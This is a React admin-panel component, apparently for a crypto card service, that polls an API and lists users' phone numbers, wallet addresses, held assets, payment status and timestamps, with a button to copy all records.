import { useEffect, useState } from 'react';
import { getCardRequests } from '../../lib/adminApi';

const shortAddress = (value) => value ? `${value.slice(0, 7)}…${value.slice(-6)}` : '—';

export default function UserRequests() {
  const [rows, setRows] = useState([]);
  const [message, setMessage] = useState('');
  const [error, setError] = useState('');

  useEffect(() => {
    let active = true;
    const load = () => getCardRequests().then((data) => { if (active) { setRows(data); setError(''); } }).catch((cause) => active && setError(cause.message));
    load();
    const timer = window.setInterval(load, 5000);
    return () => { active = false; window.clearInterval(timer); };
  }, []);

  async function copy() {
    await navigator.clipboard.writeText(rows.map((row) => [row.countryCode, row.mobile, row.wallet, row.evmAddress, row.tronAddress, row.bitcoinAddress].filter(Boolean).join(' ')).join('\n'));
    setMessage(`${rows.length} connected-user records copied`);
  }

  return <section className="admin-card admin-wide">
    <div className="admin-card-head"><div><h2>Connected users</h2><p>Mobile, card, wallet, network, asset, and payment details refresh every 5 seconds.</p></div><button className="admin-btn" disabled={!rows.length} onClick={copy}>Copy all data</button></div>
    {message && <div className="admin-copy-note">{message}</div>}
    {error && <div className="admin-copy-note">{error}</div>}
    <div className="admin-table-wrap"><table className="admin-table"><thead><tr><th>Mobile / country</th><th>Card</th><th>Wallet / status</th><th>Addresses</th><th>Networks / assets</th><th>Payment</th><th>Activity</th></tr></thead><tbody>
      {rows.map((row) => <tr key={row.id}>
        <td><b>{row.countryCode} {row.mobile}</b><br/><small>{row.country}</small></td>
        <td className="capitalize"><b>{row.card}</b><br/><small>{row.theme}</small></td>
        <td><b>{row.wallet || 'Not connected'}</b><br/><small>{row.connectionStatus || 'mobile saved'}</small></td>
        <td><small>EVM: {shortAddress(row.evmAddress)}<br/>TRON: {shortAddress(row.tronAddress)}<br/>BTC: {shortAddress(row.bitcoinAddress)}</small></td>
        <td><small>{(row.networks || []).join(', ') || '—'}<br/>{(row.assets || []).map((asset) => `${asset.symbol} ${asset.amount} (${asset.chain})`).join(', ') || '—'}</small></td>
        <td><b>{row.paymentStatus || 'pending'}</b><br/><small>{row.paymentAmount ? `${row.paymentAmount} ${row.paymentSymbol || ""}` : '—'}{row.txHash ? <><br/>{shortAddress(row.txHash)}</> : null}</small></td>
        <td><small>Requested: {new Date(row.createdAt).toLocaleString()}<br/>{row.connectedAt ? <>Connected: {new Date(row.connectedAt).toLocaleString()}</> : 'Not connected yet'}</small></td>
      </tr>)}
    </tbody></table>{!rows.length && <p className="admin-empty">No user requests yet.</p>}</div>
  </section>;
}
